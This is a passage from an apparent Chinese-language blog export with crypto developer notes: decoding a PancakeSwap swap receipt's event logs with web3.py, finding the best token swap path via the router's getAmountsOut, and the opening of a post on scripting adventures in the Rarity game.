<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">self.w3.eth.send_raw_transaction(signed_tx.rawTransaction)</span><br></pre></td></tr></table></figure>

<ol start="5">
<li><strong>wait_for_transaction_receipt</strong> 等待交易完成，获取收据</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">self.w3.eth.wait_for_transaction_receipt(tx, timeout=<span class="number">60</span>)</span><br></pre></td></tr></table></figure>

<ol start="6">
<li><strong>processReceipt</strong> 可以解析获取Transfer事件的内容</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">logs = self.get_token_contract(token_address=token_address).events.Transfer().processReceipt(receipt)</span><br></pre></td></tr></table></figure>

<h1 id="receipt-log-交易收据log"><a href="#receipt-log-交易收据log" class="headerlink" title="receipt log 交易收据log:"></a>receipt log 交易收据log:</h1><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/2B776BF8-05AF-41A0-ADE5-402D51A5771E.png" alt="2B776BF8-05AF-41A0-ADE5-402D51A5771E"></p>
<p><a href="https://bscscan.com/tx/0xa1215da3b2f9fba0dc4ce90318fd42e947d596e91c6582d8b450612f6a472abf">tx记录</a></p>
<p>example:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x9ba33f85ec6edccfee637ae9a3eb8303df74aeb81cbc106676c1af44f7291cb3&#x27;</span>),</span><br><span class="line">	<span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">11864838</span>,</span><br><span class="line">	<span class="string">&#x27;contractAddress&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line">	<span class="string">&#x27;cumulativeGasUsed&#x27;</span>: <span class="number">34932511</span>,</span><br><span class="line">	<span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;0x302c98e6d6A65Bf15255b81972f9EaA1F45438C8&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;gasUsed&#x27;</span>: <span class="number">130517</span>,</span><br><span class="line">	<span class="string">&#x27;logs&#x27;</span>: [AttributeDict(&#123;</span><br><span class="line">		<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;topics&#x27;</span>: [HexBytes(<span class="string">&#x27;0xe1fffcc4923d04b559f4d29a8bfc6cda04eb5b0d3c460751c2402c5c5cc9109c&#x27;</span>), HexBytes(<span class="string">&#x27;0x00000000000000000000000010ed43c718714eb63d5aa57b78b54704e256024e&#x27;</span>)],</span><br><span class="line">		<span class="string">&#x27;data&#x27;</span>: <span class="string">&#x27;0x00000000000000000000000000000000000000000000000000038d7ea4c68000&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">11864838</span>,</span><br><span class="line">		<span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xa1215da3b2f9fba0dc4ce90318fd42e947d596e91c6582d8b450612f6a472abf&#x27;</span>),</span><br><span class="line">		<span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">215</span>,</span><br><span class="line">		<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x9ba33f85ec6edccfee637ae9a3eb8303df74aeb81cbc106676c1af44f7291cb3&#x27;</span>),</span><br><span class="line">		<span class="string">&#x27;logIndex&#x27;</span>: <span class="number">752</span>,</span><br><span class="line">		<span class="string">&#x27;removed&#x27;</span>: <span class="literal">False</span></span><br><span class="line">	&#125;), AttributeDict(&#123;</span><br><span class="line">		<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;topics&#x27;</span>: [HexBytes(<span class="string">&#x27;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#x27;</span>), HexBytes(<span class="string">&#x27;0x00000000000000000000000010ed43c718714eb63d5aa57b78b54704e256024e&#x27;</span>), HexBytes(<span class="string">&#x27;0x000000000000000000000000ef5212ada83ec2cc105c409df10b8806d20e3b35&#x27;</span>)],</span><br><span class="line">		<span class="string">&#x27;data&#x27;</span>: <span class="string">&#x27;0x00000000000000000000000000000000000000000000000000038d7ea4c68000&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">11864838</span>,</span><br><span class="line">		<span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xa1215da3b2f9fba0dc4ce90318fd42e947d596e91c6582d8b450612f6a472abf&#x27;</span>),</span><br><span class="line">		<span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">215</span>,</span><br><span class="line">		<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x9ba33f85ec6edccfee637ae9a3eb8303df74aeb81cbc106676c1af44f7291cb3&#x27;</span>),</span><br><span class="line">		<span class="string">&#x27;logIndex&#x27;</span>: <span class="number">753</span>,</span><br><span class="line">		<span class="string">&#x27;removed&#x27;</span>: <span class="literal">False</span></span><br><span class="line">	&#125;), AttributeDict(&#123;</span><br><span class="line">		<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;0x5F84ce30DC3cF7909101C69086c50De191895883&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;topics&#x27;</span>: [HexBytes(<span class="string">&#x27;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#x27;</span>), HexBytes(<span class="string">&#x27;0x000000000000000000000000ef5212ada83ec2cc105c409df10b8806d20e3b35&#x27;</span>), HexBytes(<span class="string">&#x27;0x000000000000000000000000302c98e6d6a65bf15255b81972f9eaa1f45438c8&#x27;</span>)],</span><br><span class="line">		<span class="string">&#x27;data&#x27;</span>: <span class="string">&#x27;0x000000000000000000000000000000000000000000000015e7daca2ce9a452a0&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">11864838</span>,</span><br><span class="line">		<span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xa1215da3b2f9fba0dc4ce90318fd42e947d596e91c6582d8b450612f6a472abf&#x27;</span>),</span><br><span class="line">		<span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">215</span>,</span><br><span class="line">		<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x9ba33f85ec6edccfee637ae9a3eb8303df74aeb81cbc106676c1af44f7291cb3&#x27;</span>),</span><br><span class="line">		<span class="string">&#x27;logIndex&#x27;</span>: <span class="number">754</span>,</span><br><span class="line">		<span class="string">&#x27;removed&#x27;</span>: <span class="literal">False</span></span><br><span class="line">	&#125;), AttributeDict(&#123;</span><br><span class="line">		<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;0xEf5212aDa83EC2cc105C409DF10b8806D20E3b35&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;topics&#x27;</span>: [HexBytes(<span class="string">&#x27;0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1&#x27;</span>)],</span><br><span class="line">		<span class="string">&#x27;data&#x27;</span>: <span class="string">&#x27;0x0000000000000000000000000000000000000000007f1919c0dd1f6e07bbbe220000000000000000000000000000000000000000000000148fc351f07c27c38d&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">11864838</span>,</span><br><span class="line">		<span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xa1215da3b2f9fba0dc4ce90318fd42e947d596e91c6582d8b450612f6a472abf&#x27;</span>),</span><br><span class="line">		<span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">215</span>,</span><br><span class="line">		<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x9ba33f85ec6edccfee637ae9a3eb8303df74aeb81cbc106676c1af44f7291cb3&#x27;</span>),</span><br><span class="line">		<span class="string">&#x27;logIndex&#x27;</span>: <span class="number">755</span>,</span><br><span class="line">		<span class="string">&#x27;removed&#x27;</span>: <span class="literal">False</span></span><br><span class="line">	&#125;), AttributeDict(&#123;</span><br><span class="line">		<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;0xEf5212aDa83EC2cc105C409DF10b8806D20E3b35&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;topics&#x27;</span>: [HexBytes(<span class="string">&#x27;0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822&#x27;</span>), HexBytes(<span class="string">&#x27;0x00000000000000000000000010ed43c718714eb63d5aa57b78b54704e256024e&#x27;</span>), HexBytes(<span class="string">&#x27;0x000000000000000000000000302c98e6d6a65bf15255b81972f9eaa1f45438c8&#x27;</span>)],</span><br><span class="line">		<span class="string">&#x27;data&#x27;</span>: <span class="string">&#x27;0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000038d7ea4c68000000000000000000000000000000000000000000000000015e7daca2ce9a452a00000000000000000000000000000000000000000000000000000000000000000&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">11864838</span>,</span><br><span class="line">		<span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xa1215da3b2f9fba0dc4ce90318fd42e947d596e91c6582d8b450612f6a472abf&#x27;</span>),</span><br><span class="line">		<span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">215</span>,</span><br><span class="line">		<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x9ba33f85ec6edccfee637ae9a3eb8303df74aeb81cbc106676c1af44f7291cb3&#x27;</span>),</span><br><span class="line">		<span class="string">&#x27;logIndex&#x27;</span>: <span class="number">756</span>,</span><br><span class="line">		<span class="string">&#x27;removed&#x27;</span>: <span class="literal">False</span></span><br><span class="line">	&#125;)],</span><br><span class="line">	<span class="string">&#x27;logsBloom&#x27;</span>: HexBytes(<span class="string">&#x27;0xx27;</span>),</span><br><span class="line">	<span class="string">&#x27;status&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">	<span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0x10ED43C718714eb63d5aA57B78B54704E256024E&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xa1215da3b2f9fba0dc4ce90318fd42e947d596e91c6582d8b450612f6a472abf&#x27;</span>),</span><br><span class="line">	<span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">215</span>,</span><br><span class="line">	<span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;0x0&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Event:</p>
<ol>
<li>Wbnb Deposit() </li>
<li>Wbnb Transfer()</li>
<li>VRT Transfer()</li>
<li>PancakeSwap V2: VRT 5 Sync()</li>
<li>PancakeSwap V2: VRT 5 Swap()</li>
</ol>
<h2 id="Events"><a href="#Events" class="headerlink" title="Events:"></a>Events:</h2><p>交易后可以获取到收据对象，收据对象里有log,记录了每个调用函数的 入参</p>
<ol>
<li>Wbnb——Deposit()</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">AttributeDict(&#123;</span><br><span class="line">	<span class="string">&#x27;args&#x27;</span>: AttributeDict(&#123;</span><br><span class="line">		<span class="string">&#x27;dst&#x27;</span>: <span class="string">&#x27;0x10ED43C718714eb63d5aA57B78B54704E256024E&#x27;</span>, <span class="comment"># router_v2</span></span><br><span class="line">		<span class="string">&#x27;wad&#x27;</span>: <span class="number">1000000000000000</span> <span class="comment"># 买入时 输入0.001BNB</span></span><br><span class="line">	&#125;),</span><br><span class="line">	<span class="string">&#x27;event&#x27;</span>: <span class="string">&#x27;Deposit&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;logIndex&#x27;</span>: <span class="number">752</span>,</span><br><span class="line">	<span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">215</span>,</span><br><span class="line">	<span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xa1215da3b2f9fba0dc4ce90318fd42e947d596e91c6582d8b450612f6a472abf&#x27;</span>),</span><br><span class="line">	<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x9ba33f85ec6edccfee637ae9a3eb8303df74aeb81cbc106676c1af44f7291cb3&#x27;</span>),</span><br><span class="line">	<span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">11864838</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>往<code>router_v2</code>质押了0.001 BNB</p>
<ol start="2">
<li>Wbnb——Transfer()</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">AttributeDict(&#123;</span><br><span class="line">	<span class="string">&#x27;args&#x27;</span>: AttributeDict(&#123;</span><br><span class="line">		<span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;0x10ED43C718714eb63d5aA57B78B54704E256024E&#x27;</span>, <span class="comment"># router_v2</span></span><br><span class="line">		<span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0xEf5212aDa83EC2cc105C409DF10b8806D20E3b35&#x27;</span>, <span class="comment"># PancakeSwap V2: VRT 5</span></span><br><span class="line">		<span class="string">&#x27;value&#x27;</span>: <span class="number">1000000000000000</span> <span class="comment"># 买入时 输入0.001BNB</span></span><br><span class="line">	&#125;),</span><br><span class="line">	<span class="string">&#x27;event&#x27;</span>: <span class="string">&#x27;Transfer&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;logIndex&#x27;</span>: <span class="number">753</span>,</span><br><span class="line">	<span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">215</span>,</span><br><span class="line">	<span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xa1215da3b2f9fba0dc4ce90318fd42e947d596e91c6582d8b450612f6a472abf&#x27;</span>),</span><br><span class="line">	<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x9ba33f85ec6edccfee637ae9a3eb8303df74aeb81cbc106676c1af44f7291cb3&#x27;</span>),</span><br><span class="line">	<span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">11864838</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p><code>router_v2</code>给<code>PancakeSwap V2: VRT 5</code>转了0.001BNB</p>
<ol start="3">
<li>VRT——Transfer()</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">AttributeDict(&#123;</span><br><span class="line">	<span class="string">&#x27;args&#x27;</span>: AttributeDict(&#123;</span><br><span class="line">		<span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;0xEf5212aDa83EC2cc105C409DF10b8806D20E3b35&#x27;</span>, <span class="comment"># PancakeSwap V2: VRT 5</span></span><br><span class="line">		<span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0x302c98e6d6A65Bf15255b81972f9EaA1F45438C8&#x27;</span>, <span class="comment"># My Address</span></span><br><span class="line">		<span class="string">&#x27;value&#x27;</span>: <span class="number">404088513609832092320</span> <span class="comment"># 得到404.08851360983209232 vrt</span></span><br><span class="line">	&#125;),</span><br><span class="line">	<span class="string">&#x27;event&#x27;</span>: <span class="string">&#x27;Transfer&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;logIndex&#x27;</span>: <span class="number">754</span>,</span><br><span class="line">	<span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">215</span>,</span><br><span class="line">	<span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xa1215da3b2f9fba0dc4ce90318fd42e947d596e91c6582d8b450612f6a472abf&#x27;</span>),</span><br><span class="line">	<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;0x5F84ce30DC3cF7909101C69086c50De191895883&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x9ba33f85ec6edccfee637ae9a3eb8303df74aeb81cbc106676c1af44f7291cb3&#x27;</span>),</span><br><span class="line">	<span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">11864838</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p><code>PancakeSwap V2: VRT 5</code>给<code>My Address</code>转了404.08851360983209232 vrt</p>
<ol start="4">
<li>PancakeSwap V2: VRT 5——Sync()</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">AttributeDict(&#123;</span><br><span class="line">	<span class="string">&#x27;args&#x27;</span>: AttributeDict(&#123;</span><br><span class="line">		<span class="string">&#x27;reserve0&#x27;</span>: <span class="number">153652113319030071628643874</span>,</span><br><span class="line">		<span class="string">&#x27;reserve1&#x27;</span>: <span class="number">379294095135390286733</span></span><br><span class="line">	&#125;),</span><br><span class="line">	<span class="string">&#x27;event&#x27;</span>: <span class="string">&#x27;Sync&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;logIndex&#x27;</span>: <span class="number">755</span>,</span><br><span class="line">	<span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">215</span>,</span><br><span class="line">	<span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xa1215da3b2f9fba0dc4ce90318fd42e947d596e91c6582d8b450612f6a472abf&#x27;</span>),</span><br><span class="line">	<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;0xEf5212aDa83EC2cc105C409DF10b8806D20E3b35&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x9ba33f85ec6edccfee637ae9a3eb8303df74aeb81cbc106676c1af44f7291cb3&#x27;</span>),</span><br><span class="line">	<span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">11864838</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>


<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(uint112 _reserve0, uint112 _reserve1,) = <span class="title function_">getReserves</span>(); <span class="comment">// gas savings</span></span><br><span class="line"><span class="comment">// 返回用于交易定价和分配流动性的token0和token1储备</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// force reserves to match balances</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sync</span>(<span class="params"></span>) external lock &#123;</span><br><span class="line">	<span class="title function_">_update</span>(<span class="title class_">IERC20</span>(token0).<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)), <span class="title class_">IERC20</span>(token1).<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)), reserve0, reserve1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看了下solidity源码，这步应该是用于同步 交易定价和分配流动性的token0和token1储备</p>
<ol start="5">
<li>PancakeSwap V2: VRT 5——Swap()</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">AttributeDict(&#123;</span><br><span class="line">	<span class="string">&#x27;args&#x27;</span>: AttributeDict(&#123;</span><br><span class="line">		<span class="string">&#x27;sender&#x27;</span>: <span class="string">&#x27;0x10ED43C718714eb63d5aA57B78B54704E256024E&#x27;</span>, <span class="comment"># router_v2</span></span><br><span class="line">		<span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0x302c98e6d6A65Bf15255b81972f9EaA1F45438C8&#x27;</span>, <span class="comment"># My Address</span></span><br><span class="line">		<span class="string">&#x27;amount0In&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">		<span class="string">&#x27;amount1In&#x27;</span>: <span class="number">1000000000000000</span>, <span class="comment"># 0.001BNB</span></span><br><span class="line">		<span class="string">&#x27;amount0Out&#x27;</span>: <span class="number">404088513609832092320</span>, <span class="comment"># 404.08851360983209232 vrt</span></span><br><span class="line">		<span class="string">&#x27;amount1Out&#x27;</span>: <span class="number">0</span></span><br><span class="line">	&#125;),</span><br><span class="line">	<span class="string">&#x27;event&#x27;</span>: <span class="string">&#x27;Swap&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;logIndex&#x27;</span>: <span class="number">756</span>,</span><br><span class="line">	<span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">215</span>,</span><br><span class="line">	<span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xa1215da3b2f9fba0dc4ce90318fd42e947d596e91c6582d8b450612f6a472abf&#x27;</span>),</span><br><span class="line">	<span class="string">&#x27;address&#x27;</span>: <span class="string">&#x27;0xEf5212aDa83EC2cc105C409DF10b8806D20E3b35&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x9ba33f85ec6edccfee637ae9a3eb8303df74aeb81cbc106676c1af44f7291cb3&#x27;</span>),</span><br><span class="line">	<span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">11864838</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这步和第3步有什么区别?</p>
</blockquote>
<hr>
<h1 id="Question"><a href="#Question" class="headerlink" title="Question:"></a>Question:</h1><h2 id="swap比转账要消耗更多的gas"><a href="#swap比转账要消耗更多的gas" class="headerlink" title="swap比转账要消耗更多的gas?"></a>swap比转账要消耗更多的gas?</h2><p>我觉得是，测试过程中，swap的话消耗 <code>0.000652585 BNB</code>，转账的话消耗 <code>0.0001071 BNB</code></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211018163457.png" alt="20211018163457"></p>
<p>swap要比转账需要更多的执行步骤, 所以需要消耗更多的gas</p>
<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary:"></a>Summary:</h1><p>交易收据里log列表里有事件event<br>event里的内容，用对应合约去解析一下，就可以看到记录里调用哪个合约的哪个函数以及哪些入参</p>
<p>感觉可以写个简单页面玩玩，类似debank里的交易历史<br><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/1A6352FF-E581-4644-88F2-A7994A20AD46.png" alt="1A6352FF-E581-4644-88F2-A7994A20AD46"></p>
<p>后面还要看看<code>预言机</code>的相关内容</p>
<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
<li><a href="https://docs.uniswap.org/protocol/V2/reference/smart-contracts/pair">uniswap pair doc</a></li>
</ul>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-pancakeswap_最佳交易对路径</title>
    <url>//49032.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>当你在pancakeswap上交易时，它会帮你找到最佳的交易对路径，中间交易代币可能是一个或多个。<br>那它这个最佳交易对路径是如何计算出来的呢?</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211020104114.png" alt="20211020104114"></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211020104124.png" alt="20211020104124"></p>
<h1 id="如何查找最佳交易对路径"><a href="#如何查找最佳交易对路径" class="headerlink" title="如何查找最佳交易对路径:"></a>如何查找最佳交易对路径:</h1><p><a href="https://docs.uniswap.org/sdk/2.0.0/reference/trade#besttradeexactin">uniswap sdk</a></p>
<p>从sdk中可以看到有<code>bestTradeExactIn</code>方法:</p>
<blockquote>
<p>给定一组对、固定数量的输入和输出的代币数量，此方法返回将maxNumResults输入代币数量交换为输出代币的最佳交易，最多maxHops跳数。<br>返回的交易按输出金额降序排列，并且都共享给定的输入金额。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Trade.bestTradeExactIn(</span><br><span class="line">    pairs: Pair[],</span><br><span class="line">    amountIn: TokenAmount,</span><br><span class="line">    tokenOut: Token,</span><br><span class="line">    &#123; maxNumResults = 3, maxHops = 3 &#125;: BestTradeOptions = &#123;&#125;): Trade[]</span><br></pre></td></tr></table></figure>

<p>意思就是哪个交易对路径最后返回的币最多，哪个就是最佳路径。<br>如果要自己简单的实现的话,可以找到对应链的主流币种，例如<code>USDT</code>,<code>BNB</code>,<code>BUSD</code>等。<br><strong>所有代币都是与这些代币中的一种或多种配对组成流动性池子的</strong>。<br>因此，只要用这些代币作为路径组合的中间币种即可，而无需考虑全部代币。</p>
<p>tokenA 兑换 tokenB 可遍历的路径包括：</p>
<ul>
<li>tokenA &gt; tokenB：只有两个代币存在直接配对的流动性池子时，该路径才有效</li>
<li>tokenA &gt; tokenC &gt; tokenB：tokenC 就是常用代币中的一种，要求 tokenA-tokenC 和 tokenC-tokenB 分别都存在流动性池子</li>
<li>tokenA &gt; tokenC &gt; tokenD &gt; tokenB：tokenC 和 tokenD 是常用代币列表中的两种代币，要求 tokenA-tokenC、tokenC-tokenD、tokenD-tokenB 这三个配对的流动性池子是有效的</li>
</ul>
<p>然后自己去简单遍历构造交易对路径。<br>调用<code>pancakeswap router</code>的<code>getAmountsOut</code>方法</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211105165458.png" alt="20211105165458"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python web3部分代码</span></span><br><span class="line">predicted_out = router_contract.functions.getAmountsOut(amount_bnb, [from_token_address, contract_addr,</span><br><span class="line">                                                                                 token_address]).call()[-<span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<p>最终哪个交易路径最后返回的币最多，哪个就是最佳路径。</p>
<h1 id="简单试验"><a href="#简单试验" class="headerlink" title="简单试验:"></a>简单试验:</h1><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211105165844.png" alt="20211105165844"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADA-BUSD-BUNNY--32.601445898030065398</span><br><span class="line">ADA-WBNB-BUNNY--57.411093623881308004</span><br><span class="line">ADA-USDT-BUNNY--13.477518281960642732</span><br><span class="line">ADA-USDC-BUNNY--0.000005664178344977</span><br><span class="line">ADA-CAKE-BUNNY--48.583485276034042082</span><br></pre></td></tr></table></figure>

<p>查询出来是含bnb的交易路径是最佳的，和前端页面显示的也对得上。</p>
<p>至于为什么不同的交易路径会有不同的返回，暂时猜测和池子的深度有关。<br>后续还有看看<code>uniswap</code>的源码后，才能更加深入的理解</p>
<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
<li><a href="https://learnblockchain.cn/question/2093">uniswap 前端是怎么计算得出一个交易对的path(route)的？</a></li>
<li><a href="https://learnblockchain.cn/question/2453">uniswap sdk 怎么获取全部交易对去筛选路径呢</a></li>
<li><a href="https://ethereum.stackexchange.com/questions/102875/uniswap-sdk-how-do-i-figure-out-the-best-route-for-a-swap-how-do-do-multiho">@uniswap SDK – how do I figure out the best route for a SWAP? How do do multihop with SDK?</a></li>
<li><a href="https://cloud.tencent.com/developer/article/1851807">这几天我写了一个DEX交易聚合器</a></li>
</ul>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-rarity自动冒险升级脚本</title>
    <url>//3287.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>rarity有一些web界面，可供玩家去冒险、升级。但是为了方便，能够自动去冒险、升级，还是自己简单写个脚本try一下。</p>
<p>顺便熟悉一下<code>solidty</code>和<code>web3js</code></p>
<hr>
<h1 id="Rarity"><a href="#Rarity" class="headerlink" title="Rarity:"></a>Rarity:</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介:"></a>简介:</h2><p>Yearn Finance 创始人 Andre Cronje 发文称受到 Loot 启发推出游戏 Rarity，在该游戏中玩家可创建召唤师，Rarity 总量没有限制，除 Gas 外无需其他费用，召唤师每天可以通过冒险赚取 xp 经验值，一旦获得了一定量的 xp 就可以升级，获得特技和法术。</p>
<p>游戏共有 11 个角色，分别是野人、吟游诗人、牧师、德鲁伊、斗士、僧侣、圣骑士、游侠、巡逻兵、巫师、法师。</p>
<hr>
<h2 id="合约源码"><a href="#合约源码" class="headerlink" title="合约源码:"></a>合约源码:</h2><p><a href="https://github.com/andrecronje/rarity/blob/main/core/rarity.sol">rarity solidity源码</a></p>
<p>简单通读一下源码,发现solidity写的代码还是挺简单的，并没想象中的难，可能跟没有那么多操作要放在链上有关。</p>
<h2 id="readContract"><a href="#readContract" class="headerlink" title="readContract:"></a>readContract:</h2><p><a href="https://ftmscan.com/address/0xce761d788df608bd21bdd59d6f4b54b2e27f25bb#readContract">https://ftmscan.com/address/0xce761d788df608bd21bdd59d6f4b54b2e27f25bb#readContract</a></p>
<p>挑几个比较重要的函数说明下</p>
<blockquote>
<p>adventures_log</p>
</blockquote>
<ul>
<li>查询下一次冒险的时间</li>
<li>input:角色id</li>
<li>output:下一次冒险的时间戳</li>
</ul>
<blockquote>
<p>summoner</p>
</blockquote>
<ul>
<li>查询角色信息</li>
<li>input:角色id</li>
<li>output:角色的经验、下一次冒险的时间戳、职业类别、等级</li>
</ul>
